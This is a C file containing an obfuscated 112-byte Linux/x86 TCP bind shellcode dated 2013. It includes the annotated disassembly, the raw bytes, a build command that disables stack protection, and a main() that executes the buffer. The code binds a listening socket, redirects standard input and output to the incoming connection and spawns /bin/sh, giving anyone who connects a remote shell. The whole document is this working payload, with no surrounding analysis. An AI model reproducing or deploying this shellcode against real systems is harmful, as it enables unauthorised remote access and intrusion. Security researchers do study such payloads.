/*

Title   : Obfuscated tcp bind shell (112 bytes)
Date    : 3 July 2013
Author  : Russell Willis <codinguy@gmail.com>
System  : Linux/x86 (SMP Debian 3.2.41-2 i686)

To build:
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode

00000000  D9EE              fldz
00000002  9BD97424F4        fstenv [esp-0xc]
00000007  5D                pop ebp
00000008  8D6D59            lea ebp,[ebp+0x59]
0000000B  31DB              xor ebx,ebx
0000000D  F7EB              imul ebx
0000000F  FEC3              inc bl
00000011  51                push ecx
00000012  6A06              push byte +0x6
00000014  6A01              push byte +0x1
00000016  6A02              push byte +0x2
00000018  FFD5              call ebp
0000001A  89C6              mov esi,eax
0000001C  FEC3              inc bl
0000001E  52                push edx
0000001F  66687A69          push word 0x697a
00000023  6653              push bx
00000025  89E1              mov ecx,esp
00000027  6A10              push byte +0x10
00000029  51                push ecx
0000002A  56                push esi
0000002B  FFD5              call ebp
0000002D  B304              mov bl,0x4
0000002F  6A01              push byte +0x1
00000031  56                push esi
00000032  FFD5              call ebp
00000034  B305              mov bl,0x5
00000036  52                push edx
00000037  52                push edx
00000038  56                push esi
00000039  FFD5              call ebp
0000003B  89C3              mov ebx,eax
0000003D  31C9              xor ecx,ecx
0000003F  B103              mov cl,0x3
00000041  FEC9              dec cl
00000043  B03F              mov al,0x3f
00000045  CD80              int 0x80
00000047  75F8              jnz 0x41
00000049  31DB              xor ebx,ebx
0000004B  F7E3              mul ebx
0000004D  51                push ecx
0000004E  EB13              jmp short 0x63
00000050  5E                pop esi
00000051  87E6              xchg esp,esi
00000053  87DC              xchg ebx,esp
00000055  B00B              mov al,0xb
00000057  CD80              int 0x80
00000059  5F                pop edi
0000005A  6A66              push byte +0x66
0000005C  58                pop eax
0000005D  89E1              mov ecx,esp
0000005F  CD80              int 0x80
00000061  57                push edi
00000062  C3                ret
00000063  E8E8FFFFFF        call dword 0x50
00000068  2F                das
00000069  62696E            bound ebp,[ecx+0x6e]
0000006C  2F                das
0000006D  2F                das
0000006E  7368              jnc 0xd8
*/

#include <stdio.h>

unsigned char code[] = \
"\xd9\xee\x9b\xd9\x74\x24\xf4\x5d\x8d\x6d\x59\x31\xdb\xf7"
"\xeb\xfe\xc3\x51\x6a\x06\x6a\x01\x6a\x02\xff\xd5\x89\xc6"
"\xfe\xc3\x52\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10\x51"
"\x56\xff\xd5\xb3\x04\x6a\x01\x56\xff\xd5\xb3\x05\x52\x52"
"\x56\xff\xd5\x89\xc3\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd"
"\x80\x75\xf8\x31\xdb\xf7\xe3\x51\xeb\x13\x5e\x87\xe6\x87"
"\xdc\xb0\x0b\xcd\x80\x5f\x6a\x66\x58\x89\xe1\xcd\x80\x57"
"\xc3\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68";

main()
{
    printf("Shellcode Length: %d\n", sizeof(code)-1);
    int (*ret)() = (int(*)())code;
    ret();
}